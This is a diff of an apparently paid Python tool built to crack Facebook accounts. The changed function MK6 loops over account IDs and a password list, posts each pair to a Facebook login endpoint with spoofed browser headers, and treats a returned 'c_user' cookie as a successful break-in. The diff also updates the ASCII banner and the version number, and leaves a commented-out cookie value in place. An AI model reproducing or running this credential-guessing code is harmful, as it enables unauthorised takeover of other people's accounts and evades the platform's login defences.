@@ -140,17 +140,15 @@ device = {
 
 logo=("""\033[1;91m
 \033[1;97m::::    ::::  :::    ::: :::::::::   ::::::::  :::    :::     :::     :::::::::  
-\033[1;97m+:+:+: :+:+:+ :+:    :+: :+:    :+: :+:    :+: :+:    :+:   :+: :+:   :+:    :+: 
-\033[1;97m+:+ +:+:+ +:+ +:+    +:+ +:+    +:+ +:+        +:+    +:+  +:+   +:+  +:+    +:+ 
-\033[1;97m+#+  +:+  +#+ +#+    +:+ +#++:++#:  +#++:++#++ +#++:++#++ +#++:++#++: +#+    +:+ 
-\033[1;97m+#+       +#+ +#+    +#+ +#+    +#+        +#+ +#+    +#+ +#+     +#+ +#+    +#+ 
-\033[1;97m#+#       #+# #+#    #+# #+#    #+# #+#    #+# #+#    #+# #+#     #+# #+#    #+# 
-\033[1;97m###       ###  ########  ###    ###  ########  ###    ### ###     ### #########  xd
+ \033[1;97m ──────────╔═╗╔╗──────╔╗
+\033[1;97m╔══╗╔╦╗╔╦╗║═╣║╚╗╔═╗─╔╝║
+\033[1;97m║║║║║║║║╔╝╠═║║║║║╬╚╗║╬║
+\033[1;97m╚╩╩╝╚═╝╚╝─╚═╝╚╩╝╚══╝╚═╝
 \033[1;37m--------------------------------------------------
 [~] Author   : murshad 
 [~] Facebook : Muhammad mansoor
 [~] Tool     : Paid
-[~] Version  : 30.0
+[~] Version  : 30.1
 \033[1;37m----------------------------------------------""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -1532,25 +1530,24 @@ def MK6(ids,passlist):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'p.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
+			header_freefb = {'authority': 'mbasic.facebook.com',
+            'viewport-width': '980',
 			'method': 'path',
 			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
-			'dnt':'1', 
-			'x-requested-with':'mark.via.gp', 
-			'sec-fetch-site': 'none',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-user': '?1',
-			'sec-fetch-dest': 'document',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-			"sec-ch-prefers-color-scheme": "light",
-			'user-agent': ua}
+             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+             'cache-control': 'max-age=0',
+             # 'cookie': 'datr=qUhTZL-aLvKHLu0MwecU6_gX; sb=qUhTZJbGOhsdyGzz4WCRDOMt',
+             'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
+             'sec-ch-ua-mobile': '?0',
+             'sec-ch-ua-platform': '"Windows"',
+             'sec-fetch-dest': 'document',
+             'sec-fetch-mode': 'navigate',
+             'sec-fetch-site': 'none',
+             'sec-fetch-user': '?1',
+             'upgrade-insecure-requests': '1',
+             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5652.221 Safari/537.36',
+}
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
